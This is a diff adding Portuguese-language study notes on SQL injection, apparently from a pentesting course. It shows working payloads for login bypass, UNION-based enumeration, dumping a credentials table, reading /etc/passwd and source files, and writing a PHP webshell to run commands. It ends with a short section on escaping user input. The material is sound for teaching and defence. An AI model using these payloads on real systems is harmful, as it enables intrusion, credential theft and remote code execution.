@@ -653,3 +653,716 @@ Porque:
 * é visual,
 * fácil de entender,
 * mostra claramente como os dados são extraídos.
+
+
+---
+
+# 🧠 Subvertendo a lógica da consulta
+
+---
+
+# 🔓 Ignorando autenticação
+
+Precisamos fazer a condição retornar:
+
+```text id="n5m7hj"
+TRUE
+```
+
+independentemente do usuário e senha.
+
+---
+
+# 💥 Payload clássico
+
+```sql id="3v7jdx"
+admin' OR 1=1;#
+```
+
+---
+
+# 📌 O que acontece
+
+A query pode virar:
+
+```sql id="7mxzjw"
+SELECT * FROM logins
+WHERE username='admin'
+OR 1=1;#
+```
+
+`1=1` sempre será verdadeiro.
+
+---
+
+# 🌐 URL Encoding
+
+Se o payload passar via GET:
+
+| Caractere | Encode |
+| --------- | ------ |
+| `'`       | `%27`  |
+| `#`       | `%23`  |
+
+---
+
+# 💬 Comentários SQL
+
+Comentários ignoram o restante da query.
+
+---
+
+## Exemplos
+
+```sql id="5rm0xw"
+#
+-- -
+```
+
+---
+
+# 📌 Exemplo
+
+```sql id="9grh4n"
+admin' OR 1=1#
+```
+
+Tudo após `#` será ignorado.
+
+---
+
+# 🧮 Usando parênteses
+
+Parênteses definem precedência lógica.
+
+---
+
+## Exemplo
+
+```sql id="bcm0lh"
+SELECT * FROM logins
+WHERE (username='admin' AND id>1)
+AND password='123';
+```
+
+O conteúdo dentro de `()` será analisado primeiro.
+
+---
+
+# 💣 Parênteses + comentários
+
+```sql id="7z9ksj"
+SELECT * FROM logins
+WHERE (username='admin' AND id>1);#
+AND password='123';
+```
+
+O campo senha será ignorado.
+
+---
+
+# 🔐 Observação
+
+Senhas normalmente:
+
+* são criptografadas,
+* usam hash.
+
+Por isso geralmente o ataque foca:
+
+* na lógica da consulta,
+* não diretamente no campo senha.
+
+---
+
+# 🔗 Cláusula UNION
+
+`UNION` combina múltiplos `SELECTs`.
+
+---
+
+# 📌 Exemplo
+
+```sql id="g4klv9"
+SELECT * FROM tabela1
+UNION
+SELECT * FROM tabela2;
+```
+
+---
+
+# ⚠️ Regras importantes do UNION
+
+Os dois SELECTs precisam ter:
+
+✅ Mesmo número de colunas
+✅ Tipos de dados compatíveis
+
+---
+
+# ❌ UNION dentro de parênteses
+
+`UNION` não pode ficar:
+
+* dentro de `()`.
+
+---
+
+# 🧪 Exemplo de ajuste de colunas
+
+Tabela 1:
+
+* 6 colunas
+
+Tabela 2:
+
+* 2 colunas
+
+---
+
+## Ajustando manualmente
+
+```sql id="3kk0z5"
+SELECT * FROM employees
+UNION
+SELECT num_depart, name_depart, 3,4,5,6
+FROM departments;
+```
+
+Os números são placeholders.
+
+---
+
+# 💉 UNION Injection
+
+Agora utilizamos o UNION:
+
+* para injetar consultas maliciosas.
+
+---
+
+# 🔍 Descobrindo quantidade de colunas
+
+Precisamos saber:
+
+* quantas colunas a query original retorna.
+
+---
+
+# 📊 Método ORDER BY
+
+---
+
+## Exemplo
+
+```sql id="cz8n8o"
+ORDER BY 1#
+ORDER BY 2#
+ORDER BY 3#
+```
+
+---
+
+# 📌 Estratégia
+
+Continuamos aumentando:
+
+* até ocorrer erro.
+
+O número que gera erro:
+
+* não existe.
+
+---
+
+# 🔢 Método UNION SELECT
+
+---
+
+## Exemplo
+
+```sql id="jlwmjd"
+' UNION SELECT 1,2,3,4#
+```
+
+Tentamos diferentes quantidades:
+
+* até funcionar.
+
+---
+
+# 🖥️ Local da injeção
+
+Nem todas as colunas aparecem na tela.
+
+Precisamos descobrir:
+
+* quais colunas são visíveis.
+
+---
+
+# 🔎 Exemplos úteis
+
+## Versão do banco
+
+```sql id="v7m9tr"
+' UNION SELECT 1,@@version,3,4#
+```
+
+---
+
+## Database atual
+
+```sql id="l3lqq7"
+' UNION SELECT 1,database(),3,4#
+```
+
+---
+
+## Usuário atual
+
+```sql id="d4mkl0"
+' UNION SELECT 1,user(),3,4#
+```
+
+---
+
+# 🗂️ Enumeração do banco de dados
+
+---
+
+# 🧠 Descobrindo o SGBD
+
+Cada banco possui:
+
+* funções,
+* sintaxe,
+* tabelas específicas.
+
+---
+
+# 🐬 Testes MySQL
+
+---
+
+## Versão
+
+```sql id="ghxq9j"
+SELECT @@version
+```
+
+---
+
+## Teste numérico
+
+```sql id="rkkxcn"
+SELECT POW(1,1)
+```
+
+MySQL:
+
+* retorna `1`.
+
+---
+
+## Blind SQLi
+
+```sql id="f6lh0l"
+SELECT SLEEP(5)
+```
+
+A resposta demora:
+
+* 5 segundos.
+
+---
+
+# 🗃️ INFORMATION_SCHEMA
+
+Database especial que contém:
+
+* databases,
+* tabelas,
+* colunas,
+* metadados.
+
+---
+
+# 🌐 Acessando tabelas de outros databases
+
+Usamos:
+
+```sql id="ny20xk"
+database.tabela
+```
+
+---
+
+## Exemplo
+
+```sql id="prz9w7"
+SELECT * FROM products.prices;
+```
+
+---
+
+# 🏛️ information_schema.schemata
+
+Lista:
+
+* todos os databases do servidor.
+
+---
+
+## Exemplo
+
+```sql id="hk6kmq"
+' UNION SELECT 1,schema_name,3,4
+FROM information_schema.schemata#
+```
+
+---
+
+# 📌 Database atual
+
+```sql id="5gsl7k"
+' UNION SELECT 1,database(),3,4#
+```
+
+---
+
+# 📑 Listando tabelas
+
+Usamos:
+
+```text id="p5rmtm"
+information_schema.tables
+```
+
+---
+
+## Colunas importantes
+
+| Coluna       | Função         |
+| ------------ | -------------- |
+| table_name   | nome da tabela |
+| table_schema | database       |
+
+---
+
+## Exemplo
+
+```sql id="0gr4x1"
+' UNION SELECT 1,table_name,3,4
+FROM information_schema.tables
+WHERE table_schema='nome_db'#
+```
+
+---
+
+# 🧱 Listando colunas
+
+Usamos:
+
+```text id="0n5gk8"
+information_schema.columns
+```
+
+---
+
+## Exemplo
+
+```sql id="lhgc4m"
+' UNION SELECT 1,column_name,3,4
+FROM information_schema.columns
+WHERE table_name='credentials'#
+```
+
+---
+
+# 🔓 Acessando dados
+
+Agora já sabemos:
+
+* databases,
+* tabelas,
+* colunas.
+
+---
+
+## Exemplo
+
+```sql id="5j0qz6"
+' UNION SELECT 1,username,password,4
+FROM dev.credentials#
+```
+
+---
+
+# 📂 SQLi e leitura de arquivos
+
+SQL Injection pode:
+
+* ler arquivos,
+* escrever arquivos,
+* executar código.
+
+---
+
+# 👤 Usuários e privilégios
+
+Precisamos descobrir:
+
+* qual usuário somos,
+* quais permissões temos.
+
+---
+
+# 🔍 Descobrir usuário
+
+```sql id="9sjlgw"
+SELECT USER()
+```
+
+---
+
+## Via SQLi
+
+```sql id="l6v6qn"
+' UNION SELECT 1,user,3,4
+FROM mysql.user#
+```
+
+---
+
+# 🔐 Verificar privilégios
+
+```sql id="0s2t7m"
+' UNION SELECT 1,super_priv,3,4
+FROM mysql.user
+WHERE user='meu_user'#
+```
+
+---
+
+# 📌 Resultado
+
+| Valor | Significado        |
+| ----- | ------------------ |
+| Y     | possui privilégios |
+| N     | não possui         |
+
+---
+
+# 📋 Descobrindo permissões
+
+```sql id="lxh19p"
+' UNION SELECT 1,grantee,privilege_type,4
+FROM information_schema.user_privileges
+WHERE grantee="'usuario'@'host'"#
+```
+
+---
+
+# 📂 Privilégio FILE
+
+Se aparecer:
+
+```text id="jlwmg9"
+FILE
+```
+
+Podemos:
+
+* ler arquivos,
+* talvez escrever arquivos.
+
+---
+
+# 📖 Lendo arquivos
+
+Usamos:
+
+```sql id="2t9t9f"
+LOAD_FILE()
+```
+
+---
+
+## Exemplo
+
+```sql id="kpp5hk"
+' UNION SELECT 1,
+LOAD_FILE('/etc/passwd'),
+3,4#
+```
+
+---
+
+# 🧾 Vazando código fonte
+
+```sql id="vpsx6p"
+' UNION SELECT 1,
+LOAD_FILE('/var/www/html/search.php'),
+3,4#
+```
+
+---
+
+# 🎯 Objetivo
+
+Encontrar:
+
+* credenciais,
+* arquivos de conexão,
+* senhas do banco.
+
+---
+
+# ✍️ Escrevendo arquivos
+
+Mais restrito em SGBDs modernos.
+
+---
+
+# ✅ Precisamos verificar
+
+* privilégio FILE,
+* secure_file_priv,
+* caminho de escrita.
+
+---
+
+# 🔐 secure_file_priv
+
+Define:
+
+* onde podemos ler/escrever arquivos.
+
+---
+
+# 📌 Possíveis valores
+
+| Valor   | Significado     |
+| ------- | --------------- |
+| caminho | pasta permitida |
+| ""      | acesso liberado |
+| NULL    | bloqueado       |
+
+---
+
+# 🔎 Descobrindo secure_file_priv
+
+```sql id="zhk2ld"
+' UNION SELECT 1,
+variable_name,
+variable_value,
+4
+FROM information_schema.global_variables
+WHERE variable_name="secure_file_priv"#
+```
+
+---
+
+# 💾 SELECT INTO OUTFILE
+
+Salva o resultado da query em um arquivo.
+
+---
+
+## Exemplos
+
+```sql id="31q0s4"
+SELECT 'teste'
+INTO OUTFILE '/tmp/test.txt';
+```
+
+---
+
+## Via SQLi
+
+```sql id="76d1b2"
+' UNION SELECT 1,
+'arquivo criado',
+3,4
+INTO OUTFILE '/var/www/html/teste.txt'#
+```
+
+---
+
+# 🐚 Escrevendo WebShell
+
+---
+
+## Payload PHP
+
+```php id="6cw2lv"
+<?php system($_GET[0]);?>
+```
+
+---
+
+## Injeção
+
+```sql id="zlhfxv"
+' UNION SELECT "",
+'<?php system($_GET[0]);?>',
+"",
+""
+INTO OUTFILE '/var/www/html/payload.php'#
+```
+
+---
+
+# 🌐 Executando comandos
+
+```text id="8f8j2v"
+www.alvo.com/payload.php?0=ls -la
+```
+
+---
+
+# 🛡️ Evitando SQL Injection
+
+---
+
+# ❌ Código vulnerável
+
+```php id="vv5t07"
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+$query = "SELECT * FROM logins
+WHERE username='".$username."'
+AND password='".$password."'";
+```
+
+Input do usuário vai direto para a query.
+
+---
+
+# ✅ Código sanitizado
+
+```php id="9c6pt1"
+$username = mysqli_real_escape_string(
+$conn,
+$_POST['username']
+);
+
+$password = mysqli_real_escape_string(
+$conn,
+$_POST['password']
+);
+```
+
+---
+
+# 🧠 Sanitização
+
+`mysqli_real_escape_string()`:
+
+* escapa caracteres perigosos,
+* reduz risco de SQL Injection.
+
+---
+
